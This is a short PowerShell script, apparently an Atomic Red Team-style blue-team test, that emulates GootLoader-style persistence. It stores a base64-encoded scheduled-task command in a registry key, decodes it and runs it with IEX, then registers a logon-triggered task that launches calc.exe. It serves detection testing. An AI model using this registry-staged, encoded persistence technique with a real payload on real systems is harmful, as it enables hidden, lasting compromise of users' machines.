###
# Atomics on a Friday
# Educational Purposes Only
# Blue Team only.
# registry path key created
# base64 encodes powesrhell register-scheduledtask and places it in key
# PowerShell reads key, runs and will start the task at end
###

# Generate a random task name
$taskName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object { [char]$_ })
Write-host $taskName

# Define the registry path and key
$registryPath = "HKCU:\SOFTWARE\Microsoft\IAmGoot"
$registryKey = "$taskName-GootsTask"
$fullRegistryPath = "$($registryPath)\$($registryKey)"
Write-host $fullRegistryPath

# Check if the registry key exists and create it if necessary
if (!(Test-Path $registryPath)) {
    New-Item -Path $registryPath | Out-Null
}

# Set the command to create the scheduled task
$executablePath = "cmd.exe"
$arguments = "/c calc.exe"
$command = "Register-ScheduledTask -TaskName $taskName -InputObject (New-ScheduledTask -Action (New-ScheduledTaskAction -Execute $executablePath -Argument $arguments) -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Settings (New-ScheduledTaskSettingsSet))"
Write-host $command

# Encode the command as base64 and save it in the registry
$encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($command))
Set-ItemProperty -Path $registryPath -Name $registryKey -Value $encodedCommand

# Get the encoded command from the registry and execute it
$registryValue = (Get-ItemProperty -Path $registryPath -Name $registryKey).$registryKey
Write-host $registryValue
$decodedCommand = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($registryValue))
IEX $decodedCommand

Start-ScheduledTask -TaskName $taskName
